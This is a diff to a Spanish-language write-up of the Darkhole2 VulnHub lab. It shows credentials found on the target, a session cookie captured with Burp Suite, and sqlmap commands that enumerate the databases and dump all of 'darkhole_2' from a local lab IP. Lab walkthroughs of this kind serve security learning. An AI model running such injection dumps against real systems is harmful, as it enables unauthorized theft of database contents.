@@ -76,9 +76,23 @@ Finalmente, descubrimos las credenciales de la página de inicio de sesión desc
 Email: lush@admin.com
 Password: 321
 ~~~
-explotación![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/ef3efe47-cf8f-408d-9592-e9b5248d0b82)
 
-sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="coiafrua9mc461a8436it7eiu4" --dbs –batch   //vemos las bases de datos
+## Eplotación
+Nos logeamos en esa página, parece ser adecuada para tácticas relacionadas con la inyección de SQL.
 
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/375d0afe-a663-4ae2-8ed7-7b8d8306ebf3)
+
+###BURP SUITE
+Entonces, usamos burpsuite para recopilar las cookies de esta página. Será ventajoso para nuestra estrategia de inyección SQL.
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/67b83dec-2f36-473b-a4fa-3e095e98f890)
+
+###Usando SQLMAP
+Insertamos la cookie capturada anteriormente en sqlmap 
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/a1530d38-1748-4d26-be2e-8bea8c6bd538)
+
+~~~
+sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="coiafrua9mc461a8436it7eiu4" --dbs –batch
 sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="coiafrua9mc461a8436it7eiu4" -D darkhole_2 --dump-all --batch
-date: "14/07/2023"
+~~~
